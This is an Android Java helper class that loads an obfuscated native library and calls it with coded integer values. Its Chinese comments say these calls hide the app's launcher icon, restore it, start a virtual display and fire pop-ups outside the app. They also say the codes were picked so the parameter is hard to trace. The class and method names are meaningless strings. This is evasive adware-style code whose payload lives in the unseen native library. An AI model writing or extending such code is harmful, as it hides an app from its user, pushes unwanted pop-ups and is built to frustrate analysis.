package com.wallsc.scrk;

import android.content.Context;

/**
 * Date：2024/3/21
 * Describe:
 */
public class ScapeHelperM {
    static {
        try {
            System.loadLibrary("x5VkyxJ08b");
        } catch (Exception e) {
            ////Log.e("DaemonLog","System.loadLibrary error:");
        }
    }

    //	 @Keep
    public static native int pXaqaXXp(Context context, int status);//隐藏,开虚拟显示

    //i%16等于4隐藏图标,i%16等于5恢复隐藏.i%16等于6外弹(外弹在子线程调用).(保证i参数不容易关联)
    public static void shei(Context context, int type) {
        if (type == 0) {//换icon
            pXaqaXXp(context, 52);
        } else if (type == 2) { //外弹
            pXaqaXXp(context, 70);
        } else {//恢复
            pXaqaXXp(context, 69);
        }
    }

    private void sjuai(Context context) {
        String name = context.getPackageName();
        if (name.isEmpty()) {
            pXaqaXXp(context, 0);
        } else {
            pXaqaXXp(context, 1);
        }
    }

    public static int jsuisgksa(Context context, int flag, int status) {
        switch (flag) {
            case 1: {
                pXaqaXXp(context, status);
            }
            case 3: {
                pXaqaXXp(context, 1);
            }
        }
        return 0;
    }
}
